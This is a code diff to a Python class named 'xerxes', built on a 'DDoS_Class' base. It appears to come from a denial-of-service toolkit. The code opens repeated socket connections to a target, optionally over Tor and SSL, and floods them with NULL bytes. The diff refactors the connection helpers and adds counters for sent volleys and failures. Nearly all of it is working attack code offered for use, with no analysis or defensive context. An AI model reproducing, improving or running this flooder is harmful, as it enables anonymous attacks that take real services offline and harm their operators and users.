@@ -15,6 +15,7 @@ class xerxes(DDoS_Class):
     ):
         self.ssl_on=ssl_on
         self.counter = 0
+        self.fails=0
         self.target = u
         self.port = p
         self.stop = False
@@ -46,12 +47,11 @@ class xerxes(DDoS_Class):
                     break
                 try:
                     if self.tor==True:
-                        s=get_tor_socket_connection(self.target,self.port,timeout=self.timeout)
+                        s=Socket_Connection.get_tor_socket_connection(self.target,self.port,timeout=self.timeout)
                     else:
-                        s=get_socket_connection(self.target,self.port,timeout=self.timeout)
+                        s=Socket_Connection.get_socket_connection(self.target,self.port,timeout=self.timeout)
                     if self.port==443 or self.ssl_on==True:
-                        s=wrap_socket_with_ssl(s,self.target)
-                    self.counter += 1
+                        s=Socket_Connection.wrap_socket_with_ssl(s,self.target)
                     """if self.logs==True:
      #print("[Connected to {}:{}]".format(self.target,self.port))
      sys.stdout.write("\r[Connected to {}:{}]".format(self.target,self.port))
@@ -65,15 +65,16 @@ class xerxes(DDoS_Class):
                             break
                         try:
                             s.send("\x00".encode("utf-8"))  # send NULL character
+                            self.counter+=1
                             if self.logs == True:
                                 sys.stdout.write("\r[{}: Voly sent]    ".format(x))
                                 sys.stdout.flush()
                         except:
+                            self.fails+=1
                             break
                         time.sleep(0.2)
                 except:
-                    pass
-                self.counter -= 1
+                    self.fails+=1
                 time.sleep(0.3)
             self.kill()
         except:
